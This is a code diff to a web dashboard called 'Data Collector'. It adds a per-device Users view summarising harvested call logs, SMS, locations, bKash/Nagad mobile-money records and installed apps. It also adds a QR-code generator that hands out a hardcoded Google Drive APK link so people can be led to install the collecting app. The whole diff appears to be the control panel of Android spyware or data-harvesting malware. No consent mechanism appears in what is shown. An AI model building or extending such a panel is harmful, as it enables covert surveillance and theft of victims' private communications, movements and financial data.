@@ -51,6 +51,28 @@
       width: 100%; padding: 8px; background: var(--card); color: var(--text); border: 1px solid var(--border); border-radius: 6px; font-size: 13px;
     }
     .sidebar .bottom label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px; display: block; margin-bottom: 6px; }
+    .sidebar .bottom .active-user-badge { margin-top: 8px; padding: 6px 10px; background: rgba(99,102,241,.15); border: 1px solid var(--accent); border-radius: 6px; font-size: 12px; color: var(--accent-l); display: none; cursor: pointer; text-align: center; }
+    .sidebar .bottom .active-user-badge:hover { background: rgba(99,102,241,.25); }
+
+    /* ── User Cards ───────────────────────── */
+    .user-cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 16px; margin-bottom: 28px; }
+    .user-card {
+      background: var(--card); border: 1px solid var(--border); border-radius: var(--radius);
+      padding: 20px; cursor: pointer; transition: all .2s;
+    }
+    .user-card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 4px 20px rgba(99,102,241,.15); }
+    .user-card.selected { border-color: var(--accent); background: rgba(99,102,241,.08); }
+    .user-card .user-header { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
+    .user-card .user-avatar { width: 48px; height: 48px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 700; color: #fff; flex-shrink: 0; }
+    .user-card .user-name { font-size: 16px; font-weight: 600; }
+    .user-card .user-id { font-size: 11px; color: var(--muted); font-family: monospace; word-break: break-all; }
+    .user-card .user-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 10px; }
+    .user-card .user-stat { text-align: center; padding: 6px; background: var(--bg2); border-radius: 6px; }
+    .user-card .user-stat .stat-val { font-size: 18px; font-weight: 700; color: var(--accent-l); }
+    .user-card .user-stat .stat-label { font-size: 10px; color: var(--muted); text-transform: uppercase; }
+    .user-card .user-meta { display: flex; justify-content: space-between; margin-top: 12px; font-size: 11px; color: var(--muted); }
+    .user-card .view-btn { display: inline-block; margin-top: 12px; padding: 6px 16px; background: var(--accent); color: #fff; border-radius: 6px; font-size: 12px; font-weight: 600; border: none; cursor: pointer; transition: all .15s; }
+    .user-card .view-btn:hover { background: var(--accent-l); }
 
     /* ── Main ─────────────────────────────── */
     .main { flex: 1; padding: 28px 32px; overflow-y: auto; }
@@ -154,6 +176,26 @@
     .spinner { display: inline-block; width: 28px; height: 28px; border: 3px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin .6s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
+    /* ── QR Code Section ──────────────────── */
+    .qr-section { display: flex; flex-direction: column; align-items: center; gap: 24px; max-width: 600px; margin: 0 auto; }
+    .qr-input-group { width: 100%; }
+    .qr-input-group label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px; display: block; margin-bottom: 8px; }
+    .qr-input-row { display: flex; gap: 10px; }
+    .qr-input-row input { flex: 1; padding: 10px 14px; background: var(--card); color: var(--text); border: 1px solid var(--border); border-radius: 8px; font-size: 14px; font-family: inherit; }
+    .qr-input-row input:focus { outline: none; border-color: var(--accent); }
+    .qr-input-row button { padding: 10px 20px; }
+    .qr-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 32px; text-align: center; width: 100%; }
+    .qr-card canvas { border-radius: 12px; }
+    .qr-card .qr-title { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+    .qr-card .qr-subtitle { font-size: 13px; color: var(--muted); margin-bottom: 20px; }
+    .qr-card .qr-url { font-size: 11px; color: var(--muted); word-break: break-all; margin-top: 16px; padding: 8px 12px; background: var(--bg2); border-radius: 6px; font-family: monospace; }
+    .qr-actions { display: flex; gap: 10px; justify-content: center; margin-top: 16px; flex-wrap: wrap; }
+    .qr-placeholder { padding: 60px 20px; color: var(--muted); text-align: center; }
+    .qr-placeholder .icon { font-size: 48px; margin-bottom: 12px; }
+    .qr-saved-url { width: 100%; padding: 12px 16px; background: rgba(99,102,241,.08); border: 1px solid var(--accent); border-radius: 8px; display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+    .qr-saved-url .url-text { font-size: 13px; word-break: break-all; color: var(--accent-l); }
+    .qr-saved-url .url-actions { display: flex; gap: 6px; flex-shrink: 0; }
+
     /* ── Responsive ───────────────────────── */
     @media (max-width: 768px) {
       body { flex-direction: column; }
@@ -175,6 +217,7 @@
     <div class="logo">Data Collector</div>
     <nav>
       <a href="#" data-tab="dashboard" class="active"><span class="icon">&#x1F4CA;</span> Dashboard</a>
+      <a href="#" data-tab="users"><span class="icon">&#x1F465;</span> Users</a>
       <a href="#" data-tab="calls"><span class="icon">&#x1F4DE;</span> Call Logs</a>
       <a href="#" data-tab="sms"><span class="icon">&#x1F4AC;</span> SMS</a>
       <a href="#" data-tab="location"><span class="icon">&#x1F4CD;</span> Location</a>
@@ -186,6 +229,7 @@
       <a href="#" data-tab="dwell"><span class="icon">&#x23F1;</span> Dwell Time</a>
       <a href="#" data-tab="behavior"><span class="icon">&#x1F9E0;</span> Behavior</a>
       <a href="#" data-tab="apps"><span class="icon">&#x1F4E6;</span> Apps</a>
+      <a href="#" data-tab="qrcode"><span class="icon">&#x1F4F2;</span> App Download</a>
     </nav>
     <div class="bottom">
       <div class="device-filter">
@@ -193,6 +237,9 @@
         <select id="deviceFilter" onchange="onDeviceFilterChange()">
           <option value="">All Devices</option>
         </select>
+      </div>
+      <div class="active-user-badge" id="activeUserBadge" onclick="clearUserFilter()" title="Click to clear filter">
+        &#x1F464; <span id="activeUserLabel"></span> ✕
       </div>
     </div>
   </div>
@@ -225,6 +272,18 @@
       <div class="table-wrap" id="dash-calls-table"></div>
       <h2 style="font-size:16px;margin:20px 0 12px">Recent SMS</h2>
       <div class="table-wrap" id="dash-sms-table"></div>
+    </div>
+
+    <!-- Users -->
+    <div class="tab" id="tab-users">
+      <h2>Users / Devices</h2>
+      <div class="toolbar">
+        <span class="info" id="users-count"></span>
+        <div class="btn-group">
+          <button class="btn btn-primary" onclick="loadUsers()">Refresh</button>
+        </div>
+      </div>
+      <div class="user-cards" id="users-list"></div>
     </div>
 
     <!-- Call Logs -->
@@ -482,9 +541,43 @@
       <div class="table-wrap" id="apps-table"></div>
     </div>
 
+    <!-- QR Code App Download -->
+    <div class="tab" id="tab-qrcode">
+      <h2>&#x1F4F2; App Download QR Code</h2>
+      <div class="qr-section">
+        <div class="qr-input-group">
+          <label>APK Download URL</label>
+          <div class="qr-input-row">
+            <input type="url" id="apkUrlInput" placeholder="Paste your APK download link here..." />
+            <button class="btn btn-primary" onclick="generateQR()">Generate QR</button>
+          </div>
+        </div>
+        <div id="savedUrlDisplay" style="width:100%;display:none"></div>
+        <div class="qr-card" id="qrCardContainer">
+          <div class="qr-placeholder" id="qrPlaceholder">
+            <div class="icon">&#x1F4F1;</div>
+            <p>Enter your APK download URL above and click <b>Generate QR</b></p>
+            <p style="font-size:12px;margin-top:8px;">Users can scan this QR code to download and install the app</p>
+          </div>
+          <div id="qrResult" style="display:none">
+            <div class="qr-title">Scan to Download App</div>
+            <div class="qr-subtitle">Point your phone camera at this QR code</div>
+            <div id="qrCanvas"></div>
+            <div class="qr-url" id="qrUrlDisplay"></div>
+            <div class="qr-actions">
+              <button class="btn btn-primary" onclick="downloadQRImage()">&#x1F4BE; Save QR Image</button>
+              <button class="btn btn-export" onclick="copyApkUrl()">&#x1F4CB; Copy URL</button>
+              <button class="btn btn-danger" onclick="clearQR()">&#x1F5D1; Clear</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
   </div>
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js"></script>
   <script>
@@ -525,6 +618,7 @@
         // Load data for tab
         switch (tab) {
           case 'dashboard':  loadDashboard(); break;
+          case 'users':      loadUsers(); break;
           case 'calls':      loadCallLogs(); break;
           case 'sms':        loadSms(); break;
           case 'location':   loadLocation(); break;
@@ -536,13 +630,123 @@
           case 'dwell':      loadLocationDwell(); break;
           case 'behavior':   loadBehaviorScores(); break;
           case 'apps':       loadInstalledApps(); break;
+          case 'qrcode':    loadQRCode(); break;
         }
       });
     });
 
     function onDeviceFilterChange() {
       currentDevice = document.getElementById('deviceFilter').value;
+      updateActiveUserBadge();
       refreshAll();
+    }
+
+    function selectUser(deviceId) {
+      currentDevice = deviceId;
+      document.getElementById('deviceFilter').value = deviceId;
+      updateActiveUserBadge();
+      // Switch to dashboard tab to show this user's data
+      document.querySelectorAll('.sidebar nav a').forEach(l => l.classList.remove('active'));
+      document.querySelector('[data-tab="dashboard"]').classList.add('active');
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.getElementById('tab-dashboard').classList.add('active');
+      refreshAll();
+    }
+
+    function clearUserFilter() {
+      currentDevice = '';
+      document.getElementById('deviceFilter').value = '';
+      updateActiveUserBadge();
+      refreshAll();
+    }
+
+    function updateActiveUserBadge() {
+      const badge = document.getElementById('activeUserBadge');
+      const label = document.getElementById('activeUserLabel');
+      if (currentDevice) {
+        const info = deviceInfoCache[currentDevice];
+        const name = info ? (info.brand + ' ' + info.model).trim() : currentDevice.substring(0, 12) + '...';
+        label.textContent = name;
+        badge.style.display = 'block';
+      } else {
+        badge.style.display = 'none';
+      }
+    }
+
+    // Cache device info for friendly names
+    let deviceInfoCache = {};
+
+    async function loadUsers() {
+      try {
+        const res = await fetch('/api/devices');
+        const json = await res.json();
+        const devices = json.devices || [];
+        document.getElementById('users-count').textContent = devices.length + ' user(s) / device(s)';
+
+        // Update cache
+        devices.forEach(d => { deviceInfoCache[d.device_id] = d; });
+
+        if (devices.length === 0) {
+          document.getElementById('users-list').innerHTML = '<div class="empty"><div class="icon">&#x1F465;</div><p>No users found. Data will appear here when devices sync.</p></div>';
+          return;
+        }
+
+        let html = '';
+        devices.forEach((d, i) => {
+          const name = (d.brand && d.model) ? d.brand + ' ' + d.model : 'Device ' + (i + 1);
+          const initial = name.charAt(0).toUpperCase();
+          const colors = ['#6366f1','#10b981','#f59e0b','#ef4444','#3b82f6','#8b5cf6','#ec4899','#14b8a6'];
+          const color = colors[i % colors.length];
+          const selected = currentDevice === d.device_id ? ' selected' : '';
+          const os = d.os_version ? 'Android ' + escHtml(d.os_version) : 'Unknown OS';
+          const firstSeen = d.first_seen ? new Date(d.first_seen).toLocaleDateString() : '—';
+          const lastSeen = d.last_seen ? new Date(d.last_seen).toLocaleString() : '—';
+
+          html += '<div class="user-card' + selected + '" onclick="selectUser(\'' + escHtml(d.device_id) + '\')">';
+          html += '  <div class="user-header">';
+          html += '    <div class="user-avatar" style="background:' + color + '">' + initial + '</div>';
+          html += '    <div>';
+          html += '      <div class="user-name">' + escHtml(name) + '</div>';
+          html += '      <div class="user-id">' + escHtml(d.device_id) + '</div>';
+          html += '      <div style="font-size:11px;color:var(--muted);margin-top:2px">' + os + '</div>';
+          html += '    </div>';
+          html += '  </div>';
+          html += '  <div class="user-stats">';
+          html += '    <div class="user-stat"><div class="stat-val">' + (d.call_logs || 0) + '</div><div class="stat-label">Calls</div></div>';
+          html += '    <div class="user-stat"><div class="stat-val">' + (d.sms || 0) + '</div><div class="stat-label">SMS</div></div>';
+          html += '    <div class="user-stat"><div class="stat-val">' + (d.location || 0) + '</div><div class="stat-label">Locations</div></div>';
+          html += '    <div class="user-stat"><div class="stat-val">' + (d.mobile_money || 0) + '</div><div class="stat-label">bKash/Nagad</div></div>';
+          html += '    <div class="user-stat"><div class="stat-val">' + (d.installed_apps || 0) + '</div><div class="stat-label">Apps</div></div>';
+          html += '    <div class="user-stat"><div class="stat-val" style="color:var(--green)">' + (d.total_records || 0) + '</div><div class="stat-label">Total</div></div>';
+          html += '  </div>';
+          html += '  <div class="user-meta">';
+          html += '    <span>First: ' + firstSeen + '</span>';
+          html += '    <span>Last: ' + lastSeen + '</span>';
+          html += '  </div>';
+          html += '  <button class="view-btn">View Data &#x2192;</button>';
+          html += '</div>';
+        });
+
+        document.getElementById('users-list').innerHTML = html;
+
+        // Also update device filter dropdown with friendly names
+        updateDeviceDropdown(devices);
+
+      } catch (e) { console.error('loadUsers error:', e); }
+    }
+
+    function updateDeviceDropdown(devices) {
+      const select = document.getElementById('deviceFilter');
+      const current = select.value;
+      select.innerHTML = '<option value="">All Devices (' + devices.length + ')</option>';
+      devices.forEach((d, i) => {
+        const name = (d.brand && d.model) ? d.brand + ' ' + d.model : 'Device ' + (i + 1);
+        const opt = document.createElement('option');
+        opt.value = d.device_id;
+        opt.textContent = name + ' (' + d.device_id.substring(0, 8) + '...)';
+        if (d.device_id === current) opt.selected = true;
+        select.appendChild(opt);
+      });
     }
 
     /* ═══════════════════════════════════════════════════════════════════════
@@ -550,6 +754,7 @@
        ═══════════════════════════════════════════════════════════════════ */
 
     async function refreshAll() {
+      loadUsers();
       loadDashboard();
       loadCallLogs();
       loadSms();
@@ -575,18 +780,21 @@
         document.getElementById('stat-telecom').textContent = (summary.total_telecom_usage || 0).toLocaleString();
         document.getElementById('stat-rides').textContent = (summary.total_ride_hailing || 0).toLocaleString();
         document.getElementById('stat-devices').textContent = summary.devices;
-        document.getElementById('lastUpdated').textContent = 'Last updated: ' + new Date().toLocaleTimeString();
+        document.getElementById('lastUpdated').textContent = 'Last updated: ' + new Date().toLocaleTimeString() + (currentDevice ? '  |  Viewing: ' + (deviceInfoCache[currentDevice] ? (deviceInfoCache[currentDevice].brand + ' ' + deviceInfoCache[currentDevice].model).trim() : currentDevice) : '  |  All Users');
 
-        // Update device filter
+        // Update device filter (friendly names are updated by loadUsers)
+        // Just ensure all device_ids are in the select
         const select = document.getElementById('deviceFilter');
-        const current = select.value;
-        select.innerHTML = '<option value="">All Devices</option>';
-        (summary.device_ids || []).forEach((d) => {
-          const opt = document.createElement('option');
-          opt.value = d; opt.textContent = d;
-          if (d === current) opt.selected = true;
-          select.appendChild(opt);
-        });
+        if (select.options.length <= 1 && (summary.device_ids || []).length > 0) {
+          (summary.device_ids || []).forEach((d) => {
+            const opt = document.createElement('option');
+            opt.value = d;
+            const info = deviceInfoCache[d];
+            opt.textContent = info ? (info.brand + ' ' + info.model).trim() + ' (' + d.substring(0,8) + '...)' : d;
+            if (d === currentDevice) opt.selected = true;
+            select.appendChild(opt);
+          });
+        }
 
         // Recent calls (5)
         const calls = await apiGet('/api/data/call_logs?limit=5');
@@ -1389,6 +1597,138 @@
       }
 
       if (exported === 0) alert('No data to export.');
+    }
+
+    /* ═══════════════════════════════════════════════════════════════════════
+       QR Code — App Download
+       ═══════════════════════════════════════════════════════════════════ */
+
+    const QR_STORAGE_KEY = 'datacollector_apk_url';
+    const DEFAULT_APK_URL = 'https://drive.google.com/uc?export=download&id=1eSJNEH5pLMlS0wxVGvK2PLdE8J50dnz0';
+
+    function loadQRCode() {
+      const saved = localStorage.getItem(QR_STORAGE_KEY) || DEFAULT_APK_URL;
+      const input = document.getElementById('apkUrlInput');
+      if (saved) {
+        input.value = saved;
+        renderQR(saved);
+        showSavedUrl(saved);
+      }
+    }
+
+    function generateQR() {
+      const url = document.getElementById('apkUrlInput').value.trim();
+      if (!url) {
+        alert('Please enter a valid APK download URL.');
+        return;
+      }
+      if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        alert('URL must start with http:// or https://');
+        return;
+      }
+      localStorage.setItem(QR_STORAGE_KEY, url);
+      renderQR(url);
+      showSavedUrl(url);
+    }
+
+    function renderQR(url) {
+      const container = document.getElementById('qrCanvas');
+      const placeholder = document.getElementById('qrPlaceholder');
+      const result = document.getElementById('qrResult');
+
+      container.innerHTML = '';
+      placeholder.style.display = 'none';
+      result.style.display = 'block';
+      document.getElementById('qrUrlDisplay').textContent = url;
+
+      const canvas = document.createElement('canvas');
+      container.appendChild(canvas);
+
+      QRCode.toCanvas(canvas, url, {
+        width: 280,
+        margin: 2,
+        color: { dark: '#1a1a2e', light: '#ffffff' }
+      }, function(err) {
+        if (err) {
+          console.error('QR generation error:', err);
+          container.innerHTML = '<p style="color:var(--red)">Failed to generate QR code</p>';
+        }
+      });
+    }
+
+    function showSavedUrl(url) {
+      const display = document.getElementById('savedUrlDisplay');
+      display.style.display = 'block';
+      display.innerHTML = '<div class="qr-saved-url">' +
+        '<span class="url-text">' + escHtml(url) + '</span>' +
+        '<div class="url-actions">' +
+        '<button class="btn btn-primary" style="padding:4px 12px;font-size:11px" onclick="window.open(\'' + escHtml(url) + '\',\'_blank\')">Open</button>' +
+        '</div></div>';
+    }
+
+    function clearQR() {
+      localStorage.removeItem(QR_STORAGE_KEY);
+      document.getElementById('apkUrlInput').value = '';
+      document.getElementById('qrCanvas').innerHTML = '';
+      document.getElementById('qrPlaceholder').style.display = 'block';
+      document.getElementById('qrResult').style.display = 'none';
+      document.getElementById('savedUrlDisplay').style.display = 'none';
+    }
+
+    function downloadQRImage() {
+      const canvas = document.querySelector('#qrCanvas canvas');
+      if (!canvas) { alert('Generate a QR code first.'); return; }
+
+      // Create a larger canvas with branding
+      const pad = 40;
+      const w = canvas.width + pad * 2;
+      const labelH = 60;
+      const h = canvas.height + pad * 2 + labelH;
+
+      const export_canvas = document.createElement('canvas');
+      export_canvas.width = w;
+      export_canvas.height = h;
+      const ctx = export_canvas.getContext('2d');
+
+      // Background
+      ctx.fillStyle = '#ffffff';
+      ctx.fillRect(0, 0, w, h);
+
+      // QR code
+      ctx.drawImage(canvas, pad, pad);
+
+      // Label
+      ctx.fillStyle = '#1a1a2e';
+      ctx.font = 'bold 16px Segoe UI, system-ui, sans-serif';
+      ctx.textAlign = 'center';
+      ctx.fillText('Scan to Download App', w / 2, canvas.height + pad + 28);
+
+      ctx.font = '11px Segoe UI, system-ui, sans-serif';
+      ctx.fillStyle = '#666';
+      ctx.fillText('Data Collector', w / 2, canvas.height + pad + 48);
+
+      // Download
+      const link = document.createElement('a');
+      link.download = 'app_download_qr.png';
+      link.href = export_canvas.toDataURL('image/png');
+      link.click();
+    }
+
+    function copyApkUrl() {
+      const url = document.getElementById('apkUrlInput').value.trim();
+      if (!url) return;
+      navigator.clipboard.writeText(url).then(() => {
+        alert('URL copied to clipboard!');
+      }).catch(() => {
+        // Fallback
+        const ta = document.createElement('textarea');
+        ta.value = url;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        alert('URL copied!');
+      });
     }
   </script>
 
